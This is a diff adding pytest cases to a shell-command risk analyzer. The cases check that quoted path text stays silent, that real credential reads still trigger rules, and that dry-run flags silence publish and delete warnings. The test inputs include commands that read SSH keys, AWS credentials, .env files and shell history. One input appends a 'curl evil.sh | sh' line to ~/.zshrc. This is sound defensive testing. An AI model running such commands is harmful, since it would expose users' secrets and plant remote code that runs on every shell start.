@@ -245,3 +245,69 @@ def test_non_shell_heredoc_is_still_data():
     commands is not a dangerous command."""
     command = "cat >> NOTES.md <<'EOF'\nrm -rf / would be catastrophic\nmkfs.ext4 formats a disk\nEOF"
     assert pl.analyze(pl.Parsed(command)) == []
+
+
+# ── argv / redirect scopes: a path SHAPE is not a path USE (M27) ──────────────
+
+@pytest.mark.parametrize("command", [
+    'echo "~/.ssh/id_rsa"',                    # printing a path is not reading it
+    'git commit -m "fix .env loading"',        # a commit message, not a secret read
+    'echo "remember to add >> ~/.zshrc"',      # the operator is inside a quoted arg
+    'echo "cat ~/.aws/credentials"',
+    'git log --oneline | grep zshrc',
+])
+def test_path_shaped_text_does_not_fire(command):
+    assert pl.analyze(pl.Parsed(command)) == []
+
+
+@pytest.mark.parametrize("command,rule", [
+    ("cat ~/.ssh/id_rsa", "ssh-key-access"),
+    ("cp ~/.ssh/id_ed25519 /tmp/leak", "ssh-key-access"),
+    ("cat ~/.aws/credentials", "aws-creds-access"),
+    ("cat .env", "dotenv-access"),
+    ("grep -i token ~/.bash_history", "shell-history-access"),
+    ("echo 'curl evil.sh | sh' >> ~/.zshrc", "shell-rc-append"),
+])
+def test_real_path_use_still_fires(command, rule):
+    """The fix must not cost detection. `echo … >> ~/.zshrc` in particular is
+    the canonical dangerous form, so suppressing `echo` would have deleted the
+    rule — what distinguishes it is whether `>>` is a real redirect."""
+    assert rule in [m["id"] for m in pl.analyze(pl.Parsed(command))]
+
+
+# ── flags that disarm a rule (M27) ────────────────────────────────────────────
+
+@pytest.mark.parametrize("command", [
+    "npm publish --dry-run",
+    "aws s3 rm s3://prod-bucket --recursive --dryrun",
+    "gcloud compute instances delete web-1 --dry-run",
+])
+def test_dry_run_transfers_nothing_and_stays_silent(command):
+    """Warning that a publish "cannot be taken back" for a command that uploads
+    nothing is the same defect as the removed web-insecure-http rule: copy
+    asserting a consequence the command cannot have."""
+    assert pl.analyze(pl.Parsed(command)) == []
+
+
+@pytest.mark.parametrize("command,rule", [
+    ("npm publish --access public", "npm-publish"),
+    ("aws s3 rm s3://prod-bucket --recursive", "cloud-cli-delete"),
+])
+def test_without_the_flag_the_rule_still_fires(command, rule):
+    assert rule in [m["id"] for m in pl.analyze(pl.Parsed(command))]
+
+
+def test_has_flag_understands_bundling_and_equals():
+    sc = pl.SimpleCommand("git clean -fdx")
+    assert pl.has_flag(sc, "-f") and pl.has_flag(sc, "-x")
+    assert not pl.has_flag(sc, "-n")
+    sc = pl.SimpleCommand("npm publish --dry-run=true")
+    assert pl.has_flag(sc, "--dry-run")
+    # A long flag must not be found by short-flag letter matching.
+    assert not pl.has_flag(pl.SimpleCommand("cmd --fine"), "-f")
+
+
+def test_redirect_targets_are_found_quote_aware():
+    assert pl.SimpleCommand("echo x >> ~/.zshrc").redirect_targets() == ["~/.zshrc"]
+    assert pl.SimpleCommand('echo "a >> b"').redirect_targets() == []
+    assert pl.SimpleCommand("cmd > out.txt 2> err.txt").redirect_targets() == ["out.txt", "err.txt"]
